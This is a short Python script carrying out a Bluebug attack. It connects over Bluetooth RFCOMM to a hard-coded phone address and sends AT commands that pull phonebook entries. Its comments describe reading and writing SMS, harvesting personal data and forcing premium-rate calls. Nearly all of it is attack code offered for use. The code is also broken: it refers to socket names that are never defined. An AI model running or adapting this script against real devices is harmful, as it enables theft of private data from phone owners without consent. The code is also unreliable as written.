# Bluebug -> If port 17 is open, connect to it.
# This attack uses the RFCOMM channel
# to issue AT commands as a tool to remotely control the device. This allows an
# attacker to read and write SMS messages, gather personal information, or force
# dial a 1–900 number

import bluetooth

tgtPhone = '18:54:CF:32:28:EE'
port = 17
phoneSock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
phoneSock.connect((tgtPhone, port))
for contact in range(1, 5):
    atCmd = 'AT+CPBR=' + str(contact) + '\n'
    phoneSock.send(atCmd)
    result = client_sock.recv(1024)
    print('[+] ' + str(contact) + ': ' + result)
sock.close()
